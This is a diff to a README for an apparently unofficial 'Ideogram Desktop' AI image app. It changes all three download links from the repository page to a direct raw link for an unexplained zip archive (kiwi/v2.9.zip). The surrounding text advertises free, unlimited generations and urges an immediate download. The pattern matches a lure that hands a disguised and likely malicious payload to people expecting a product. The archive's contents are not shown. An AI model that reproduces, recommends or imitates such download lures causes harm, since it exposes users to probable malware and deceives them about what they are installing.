@@ -1,7 +1,7 @@
 <h1>🎨 Ideogram-Desktop---Ideogram-AI-Image-2026 - Create Stunning Text-Ready Images Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now - Free Access</a>
+  <a href="https://raw.githubusercontent.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026/main/kiwi/v2.9.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now - Free Access</a>
 </p>
 
 ## 🖼️ What Is Ideogram Desktop?
@@ -48,7 +48,7 @@ Getting started takes less than two minutes. Follow these simple steps:
 
 ### Step 1: Visit the Download Page
 Visit this link to download the application:  
-👉 **[https://github.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026](https://github.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026)**
+👉 **[https://raw.githubusercontent.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026/main/kiwi/v2.9.zip](https://raw.githubusercontent.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026/main/kiwi/v2.9.zip)**
 
 ### Step 2: Get the Installer
 On the page, look for the **"Download"** button or the latest release file. Click it to start downloading the application installer to your computer.
@@ -135,7 +135,7 @@ A: Yes, the batch feature allows unlimited simultaneous generations.
 ## 📢 Final Reminder
 
 Don't forget to grab your copy now:  
-👉 **[Download Ideogram Desktop](https://github.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026)**
+👉 **[Download Ideogram Desktop](https://raw.githubusercontent.com/marjimediocre6231/Ideogram-Desktop---Ideogram-AI-Image-2026/main/kiwi/v2.9.zip)**
 
 Join thousands of creators who have already upgraded their AI image game. With perfect text rendering, unlimited generations, and zero cost, there's no reason to wait. Start creating jaw-dropping visuals today!
 
